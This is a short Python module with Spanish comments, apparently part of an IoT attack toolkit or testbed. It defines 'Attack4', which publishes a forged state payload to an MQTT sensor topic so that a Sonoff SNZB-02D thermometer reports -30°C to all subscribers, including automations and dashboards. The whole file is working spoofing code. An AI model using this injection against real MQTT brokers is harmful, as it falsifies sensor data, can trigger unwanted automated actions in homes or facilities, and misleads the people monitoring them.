from typing import Tuple

from config import ATTACK4_INTERVAL, MQTT_TEMP_STATE_TOPIC
from mqtt_service import publish_to_topic
from attacks.base import BaseAttack

# Payload basado en el estado real del sensor (Sonoff SNZB-02D).
# Se publica en el topic de estado (sin /set) para spoofear la lectura
# que ven todos los suscriptores, incluyendo automatizaciones y dashboards.
_SPOOF_PAYLOAD = {
    'battery': 100,
    'comfort_humidity_max': 60,
    'comfort_humidity_min': 40,
    'comfort_temperature_max': 27,
    'comfort_temperature_min': 19,
    'humidity': 42.4,
    'humidity_calibration': 0,
    'linkquality': 255,
    'temperature': -30,
    'temperature_calibration': 0,
    'temperature_units': 'celsius',
}


class Attack4(BaseAttack):
    """Ataque 4: Spoofea la temperatura del sensor SNZB-02D a -30°C.

    Publica directamente en el topic de estado del sensor (sin /set)
    sobreescribiendo la lectura real con un valor falso de -30°C.
    """

    def __init__(self):
        super().__init__('attack4', 'ATAQUE 4 (TEMP SPOOF -30°C)', ATTACK4_INTERVAL)

    def execute_attack(self) -> Tuple[bool, str, bool]:
        return publish_to_topic(MQTT_TEMP_STATE_TOPIC, _SPOOF_PAYLOAD)
